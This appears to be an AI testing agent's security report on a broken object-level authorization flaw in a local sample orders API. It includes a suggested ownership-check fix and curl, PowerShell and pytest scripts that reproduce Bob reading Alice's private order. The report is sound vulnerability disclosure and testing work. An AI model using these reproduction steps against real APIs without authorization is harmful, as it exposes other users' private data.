# Security Bug Report: Broken Object Level Authorization (BOLA) on GET /orders/{order_id}

**Report ID:** `report-7254adc1`  
**Finding ID:** `finding-46eb0dab`  
**Classification:** `BOLA_VIOLATION`  
**Severity:** **CRITICAL**  
**Endpoint:** `GET /orders/{order_id}`  
**Status:** `CONFIRMED_REPRODUCIBLE` (Reproducible: True)  
**Diagnosis Source:** rule_based_fallback (no LLM API key configured) (Rule-Based Deterministic Engine)  
**Timestamp:** `2026-10-13T06:55:15.844495+00:00`  

---

## 1. Executive Summary

Broken Object Level Authorization (BOLA / OWASP API1:2023) detected: User 'user-bob' successfully accessed private resource 'ord-4' belonging to user 'user-alice'. The API failed to enforce object ownership.

| Property | Specification / Requirement | Actual Observed Behavior |
| :--- | :--- | :--- |
| **Behavior** | Access denied (HTTP 403 Forbidden or HTTP 404 Not Found). User 'user-bob' does not own resource 'ord-4' (owned by 'user-alice'). | HTTP 200 returned with private resource data. |

---

## 2. Root Cause Hypothesis (AI Diagnosis)

> [!IMPORTANT]
> **Diagnostic Hypothesis:** The endpoint GET /orders/{order_id} enforces user authentication (requiring a valid Bearer token) but omits object-level authorization. The backend handler retrieves the requested object by ID and returns it directly without verifying that the authenticated user owns or is authorized to view the resource.

### Supporting Evidence Observed by Agent:
- User 'user-bob' successfully accessed private resource 'ord-4' owned by 'user-alice'.
- The server returned HTTP 200 OK with the full private order payload instead of HTTP 403 Forbidden.
- Control test confirmed that the resource owner can access the object normally.
- Reproducibility verification confirmed consistent recurrence across clean resets.

### Additional Verifications Recommended:
- [ ] Inspect the route handler in 'sample_api/main.py' to confirm if an ownership comparison exists.
- [ ] Test unauthenticated access (no Bearer header) to ensure authentication middleware is functioning.
- [ ] Test requesting a non-existent ID to ensure 404 handling occurs before authorization logic.

### Diagnostic Limitations & Uncertainties:
- *This diagnosis is formulated from black-box HTTP request/response observations and is classified as an unverified hypothesis until verified against backend source code.*

---

## 3. Actionable Code Remediation

Before returning private order details, compare the owner ID ('order["user_id"]') against the currently authenticated caller ('current_user["user_id"]'). If they do not match, reject the request with HTTP 403 Forbidden (or HTTP 404 to prevent ID enumeration).

```python
# In sample_api/main.py: get_order_by_id
if order["user_id"] != current_user["user_id"]:
    raise HTTPException(
        status_code=status.HTTP_403_FORBIDDEN,
        detail="Forbidden: You do not have permission to access this order.",
    )
```

---

## 4. Test Minimization & Reproduction Steps

- **Original Test Sequence:** 10 requests
- **Minimized Test Sequence:** 4 requests
- **Reduction Ratio:** **60.0% reduced**

### Pruned Redundant Requests:
- `[-]` Pre-Check System Health 1
- `[-]` Intermittent Health Ping 2
- `[-]` Intermittent Health Ping 3
- `[-]` Intermittent Health Ping 4
- `[-]` Post-Check System Health 5
- `[-]` Post-Check System Health 6

### Pruned Redundant Payload Fields:
- `[-]` Create Alice Order.notes
- `[-]` Create Alice Order.gift_wrap

---

## 5. Reproduction Instructions

### Option A: curl Command Sequence

```bash
#!/usr/bin/env bash
# Target: GET /orders/{order_id}

# Step 1: Reset test database
curl -s -X POST "http://127.0.0.1:8000/admin/reset"

# Step 2: Login as Alice to obtain token
ALICE_TOKEN=$(curl -s -X POST "http://127.0.0.1:8000/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

# Step 3: Create private order as Alice
ORDER_ID=$(curl -s -X POST "http://127.0.0.1:8000/orders" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -d '{"item_name":"Autonomous Drone","quantity":1,"total_price":299.99}' | grep -o '"id":"[^"]*' | cut -d'"' -f4)

# Step 4: Login as Bob to obtain Bob's token
BOB_TOKEN=$(curl -s -X POST "http://127.0.0.1:8000/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bob123"}' | grep -o '"access_token":"[^"]*' | cut -d'"' -f4)

# Step 5: Bob accesses Alice's order without authorization (BOLA exploit)
curl -i -X GET "http://127.0.0.1:8000/orders/$ORDER_ID" \
  -H "Authorization: Bearer $BOB_TOKEN"
```

### Option B: Windows PowerShell

```powershell
# Windows PowerShell Reproduction Script
# Target: GET /orders/{order_id}

# Step 1: Reset test database
Invoke-RestMethod -Method Post -Uri "http://127.0.0.1:8000/admin/reset"

# Step 2: Login as Alice to obtain her token
$alice = Invoke-RestMethod -Method Post -Uri "http://127.0.0.1:8000/auth/login" -ContentType "application/json" -Body '{"username":"alice","password":"alice123"}'

# Step 3: Create an order as Alice
$headersAlice = @{ Authorization = "Bearer " + $alice.access_token }
$order = Invoke-RestMethod -Method Post -Uri "http://127.0.0.1:8000/orders" -Headers $headersAlice -ContentType "application/json" -Body '{"item_name":"Autonomous Drone","quantity":1,"total_price":299.99}'

# Step 4: Login as Bob to obtain Bob's token
$bob = Invoke-RestMethod -Method Post -Uri "http://127.0.0.1:8000/auth/login" -ContentType "application/json" -Body '{"username":"bob","password":"bob123"}'

# Step 5: Bob retrieves Alice's private order (BOLA exploit)
$headersBob = @{ Authorization = "Bearer " + $bob.access_token }
Invoke-RestMethod -Method Get -Uri ("http://127.0.0.1:8000/orders/" + $order.id) -Headers $headersBob
```

### Option C: Standalone Pytest Test Suite

Execute independently with: `pytest reports/test_reproduce_bola.py -v`

```python
"""Standalone Automated Reproduction Test for API Bug Finding.

Generated by Autonomous AI Testing Agent (Step 7).
Target Endpoint: GET /orders/{order_id}
Classification:  BOLA_VIOLATION (CRITICAL)

Prerequisites:
- Target API must be running at http://127.0.0.1:8000
- Execute with: pytest reports/test_reproduce_bola.py -v
"""

import httpx
import pytest

BASE_URL = "http://127.0.0.1:8000"


def test_reproduce_bola_vulnerability():
    """Demonstrates that Bob can read Alice's private order without authorization."""
    with httpx.Client(base_url=BASE_URL, timeout=10.0) as client:
        # 1. Reset state to ensure clean, isolated execution
        reset_res = client.post("/admin/reset")
        assert reset_res.status_code == 200, "Failed to reset test database"

        # 2. Login as Alice
        alice_login = client.post("/auth/login", json={"username": "alice", "password": "alice123"})
        assert alice_login.status_code == 200, f"Alice login failed: {alice_login.text}"
        alice_token = alice_login.json()["access_token"]
        alice_id = alice_login.json()["user_id"]

        # 3. Create private order as Alice
        order_res = client.post(
            "/orders",
            headers={"Authorization": f"Bearer {alice_token}"},
            json={"item_name": "Autonomous Drone", "quantity": 1, "total_price": 299.99},
        )
        assert order_res.status_code == 201, f"Order creation failed: {order_res.text}"
        order_id = order_res.json()["id"]

        # 4. Login as Bob
        bob_login = client.post("/auth/login", json={"username": "bob", "password": "bob123"})
        assert bob_login.status_code == 200, f"Bob login failed: {bob_login.text}"
        bob_token = bob_login.json()["access_token"]
        bob_id = bob_login.json()["user_id"]

        # 5. Bob attempts to access Alice's private order
        bob_access = client.get(
            f"/orders/{order_id}",
            headers={"Authorization": f"Bearer {bob_token}"},
        )

        # ----------------------------------------------------------------------
        # REPRODUCTION ASSERTION:
        # The vulnerable endpoint returns HTTP 200 and Alice's order to Bob!
        # In a secure implementation, this request would return HTTP 403 Forbidden.
        # ----------------------------------------------------------------------
        assert bob_access.status_code == 200, (
            f"Expected BOLA exploit (HTTP 200), received {bob_access.status_code}"
        )
        data = bob_access.json()
        assert data["user_id"] == alice_id, "Returned order owner does not match Alice"
        assert bob_id != alice_id, "Accessor and owner must be distinct accounts"

```

---

## 6. Collected Evidence Dump

```json
{
  "vulnerability_standard": "OWASP API Security Top 10 (2023) - API1: BOLA",
  "resource_id": "ord-4",
  "resource_owner_id": "user-alice",
  "accessor_user_id": "user-bob",
  "returned_owner_id": "user-alice",
  "is_unauthorized_access": true
}
```